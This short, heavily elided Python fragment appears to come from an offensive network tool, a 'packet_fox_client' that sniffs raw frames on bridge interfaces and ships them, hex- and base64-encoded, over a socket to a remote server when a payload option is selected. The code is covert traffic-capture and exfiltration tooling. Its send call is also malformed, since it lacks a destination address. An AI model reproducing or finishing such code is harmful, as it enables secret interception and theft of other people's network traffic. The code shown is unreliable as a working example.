    ...
    while True:
        ...
        try:
            ...
            if send_lan and send_port:
                secure_sock.sendto(base64.b64encode(binascii.hexlify(packet).decode().encode()))

        except:
            continue

def wlan_sniff(server):
    interface_list = socket.if_nameindex()
    for interface in interface_list:
        if "br" in interface[1]:
            wlan_socket = socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.ntohs(3))
            wlan_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
...
def packet_fox_client():
    ...
    if payloads == "10":
        wlan_thread = threading.Thread(target=wlan_sniff,args=[server]).start()
